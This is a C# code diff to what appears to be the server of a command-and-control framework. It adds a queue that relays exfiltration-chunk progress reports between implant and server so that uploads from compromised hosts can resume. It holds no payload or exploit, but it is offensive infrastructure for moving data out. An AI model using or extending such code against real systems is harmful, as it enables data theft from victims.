@@ -139,8 +139,13 @@ internal sealed class BeaconSessionRunner
         // connection rides the next contact instead of stranding Dispatched.
         // Concurrent because the writer adds while the reader clears.
         var unacked = new ConcurrentDictionary<TaskId, byte>();
-        var reader = ReadResultsAsync(session, connection, read, pulls, unacked, linked, carrier);
-        var writer = DispatchTasksAsync(session, pulls, inputs, write, unacked, linked.Token);
+        // The exfil seam reports this stream owes its implant (ADR-010's
+        // upload arm): the reader collects them as offset-bearing chunks
+        // place, the writer -- the stream's sole frame writer -- pushes them
+        // downstream. Concurrent for the same reason the dispatch ledger is.
+        var exfilProgress = new ConcurrentQueue<Frame>();
+        var reader = ReadResultsAsync(session, connection, read, pulls, unacked, exfilProgress, linked, carrier);
+        var writer = DispatchTasksAsync(session, pulls, inputs, write, unacked, exfilProgress, linked.Token);
 
         // Whichever finishes first cancels the other. The writer only ever ends
         // via cancellation (its loop runs for the session). How the first
@@ -211,6 +216,7 @@ internal sealed class BeaconSessionRunner
         BeaconFrameReader read,
         ConcurrentQueue<StagedPullDemand> stagedPulls,
         ConcurrentDictionary<TaskId, byte> unacked,
+        ConcurrentQueue<Frame> exfilProgress,
         CancellationTokenSource linked,
         string carrier)
     {
@@ -221,8 +227,8 @@ internal sealed class BeaconSessionRunner
                 session.Implant, session.Capabilities, _clock.GetUtcNow(), carrier, cancellationToken);
 
             // The session may have been closed out from under this stream -- the
-            // staleness sweep, or a reconnect that opened a newer session for the
-            // implant. TouchAsync is a no-op then, so every later frame would
+            // staleness sweep, or a reconnect that opened a newer session for
+            // the implant. TouchAsync is a no-op then, so every later frame would
             // keep refreshing a session this stream no longer holds; end the
             // stream instead so the implant reconnects and re-handshakes (its
             // beacon loop treats a dropped stream as a normal reconnect).
@@ -243,6 +249,16 @@ internal sealed class BeaconSessionRunner
                 },
                 taskAckSink: taskId => unacked.TryRemove(taskId, out _),
                 cancellationToken);
+
+            // Offset-bearing exfil chunks placed on this stream answer with
+            // their seam report (ADR-010's upload arm): hand it to the writer
+            // and release the wake so it leaves promptly rather than at the
+            // next dispatch.
+            foreach (var progress in connection.TakeExfilProgress())
+            {
+                exfilProgress.Enqueue(progress);
+                _wake.Release(session.Implant);
+            }
         }
     }
 
@@ -262,15 +278,29 @@ internal sealed class BeaconSessionRunner
         BeaconChannelSink inputs,
         BeaconFrameWriter write,
         ConcurrentDictionary<TaskId, byte> unacked,
+        ConcurrentQueue<Frame> exfilProgress,
         CancellationToken cancellationToken)
     {
         while (!cancellationToken.IsCancellationRequested)
         {
             await DispatchNextAsync(session, write, unacked, cancellationToken);
             await StreamStagedPullsAsync(stagedPulls, write, cancellationToken);
+            await StreamExfilProgressAsync(exfilProgress, write, cancellationToken);
             await StreamChannelInputsAsync(inputs, write, cancellationToken);
             await _wake.WaitAsync(session.Implant, cancellationToken);
         }
+    }
+
+    // Pushes the seam reports the reader collected (ADR-010's upload arm),
+    // one frame per stream the contact placed offset-bearing chunks for, at
+    // the store's freshest held count.
+    private static async Task StreamExfilProgressAsync(
+        ConcurrentQueue<Frame> exfilProgress,
+        BeaconFrameWriter write,
+        CancellationToken cancellationToken)
+    {
+        while (exfilProgress.TryDequeue(out var frame))
+            await write(frame, cancellationToken);
     }
 
     // Drains the operator input the route queued onto this stream's sink, one
